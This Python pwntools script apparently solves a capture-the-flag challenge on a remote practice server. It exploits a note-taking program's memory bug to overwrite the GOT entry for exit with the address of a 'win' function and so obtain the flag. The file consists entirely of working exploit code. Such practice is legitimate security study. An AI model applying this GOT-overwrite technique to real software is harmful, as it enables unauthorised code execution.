from pwn import *



context(kernel="amd64", arch="amd64", log_level="debug")

def menu(proc, choose):
	proc.recvuntil(b"> ")
	proc.sendline(str(choose).encode("utf-8"))

def change_char(proc, later, now):
	menu(proc, 5)
	proc.recvuntil(b": ")
	proc.sendline(later)
	proc.recvuntil(b": ")
	proc.sendline(now)

def print_note(proc, note_n):
	menu(proc, 4)
	proc.recvuntil(b": ")
	proc.sendline(str(note_n).encode("utf-8"))
	title = proc.recvuntil(b" : ")
	# Received title
	data = proc.recvuntil(b"\nMenu")
	return title[:-3], data[:-5]

def delete_node(proc, note_n):
	menu(proc, 3)
	proc.recvuntil(b": ")
	proc.sendline(str(note_n).encode("utf-8"))
	proc.recvuntil(b"Menu")

def edit_note(proc, note_n ,new_data):
	menu(proc, 2)
	print(proc.recvuntil(b": "))
	proc.sendline(str(note_n).encode("utf-8"))
	print(proc.recvuntil(b"Title"))
	# Here could receive title
	print(proc.recvuntil(b": "))
	proc.send(new_data)


def make_note(proc, title, data, size):
	menu(proc, 1)
	proc.recvuntil(b": ")
	proc.sendline(str(size).encode("utf-8"))
	proc.recvuntil(b": ")
	proc.send(title)
	proc.recvuntil(b": ")
	proc.send(data)


"""
Menu:
  1. Make note.
  2. Edit note.
  3. Delete note.
  4. Print note.
  0. Exit
"""

def main():
	# Task: overwrite exit got address and wait some time 
	e = ELF("challenge")
	if 0:
		p = process("./challenge")
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30030)

	win_addr = e.symbols["win"]
	exit_addr = e.got["exit"]

	make_note(p, b"TestTitle", b"A"*0x20+pack(exit_addr)[:-1], 40)
	# edit_note(p, 0, b"Other")
	delete_node(p, 0)
	make_note(p, b"NewTitle", pack(win_addr), 100)
	title, result = print_note(p, 0)
	print(f"Title is {title}")
	print(f"Result is: {result}")
	# menu(p, 0)
	# Just wait for the flag to appear here.......
	print(p.recvrepeat())

main()